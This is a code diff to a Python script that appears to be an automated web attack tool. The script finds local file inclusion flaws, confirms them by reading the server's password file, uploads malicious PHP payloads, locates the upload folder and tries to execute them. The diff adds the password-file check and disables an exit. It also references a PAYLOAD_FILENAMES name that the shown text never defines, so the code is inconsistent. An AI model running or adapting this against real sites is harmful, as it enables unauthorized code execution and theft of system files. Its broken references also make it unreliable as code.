@@ -15,7 +15,7 @@ UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
 WORDLIST = "wordlists/test"
 COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"}
 
-PAYLOAD_FILENAME = "malicious.php"
+# PAYLOAD_FILENAME = "malicious.php"
 REPORT_FILENAME = "vuln_report.txt"
 CONTENT_TYPE_FILE = "content_type.txt"
 
@@ -92,6 +92,13 @@ def main():
     print("\nPotential LFI vulnerabilities:")
     lfi_targets = crawler.check_lfi(found_urls)
 
+    lfi_confirmed_targets = set()
+    for target in lfi_targets:
+        print(target)
+        result = lfi.show_passwd(target, COOKIE)
+        if result:
+            lfi_confirmed_targets.add(target)
+
     # 🔹 Step 2: Generate payloads
     generated_payloads = uploadv2.create_payloads()
 
@@ -119,7 +126,7 @@ def main():
 
     # 🔹 Step 6: Detect upload directory
     dynamic_upload_dir = uploadv2.get_upload_directory(
-        URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE
+        URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAMES, COOKIE
     )
 
     if not uploaded_files:
@@ -132,13 +139,13 @@ def main():
     else:
         print("[-] No valid upload directory found. Exiting.")
         generate_report(uploaded_files, failed_files, [])
-        exit(1)
+        #exit(1)
 
     # 🔹 Step 7: Test execution
     executed_files = []
     for target in lfi_targets:
         lfi_found_url = lfi.brute_force_lfi(
-            target, dynamic_upload_dir + PAYLOAD_FILENAME, session, COOKIE
+            target, dynamic_upload_dir + PAYLOAD_FILENAMES, session, COOKIE
         )
         if lfi_found_url:
             print(f"[+] LFI Found at: {lfi_found_url}")
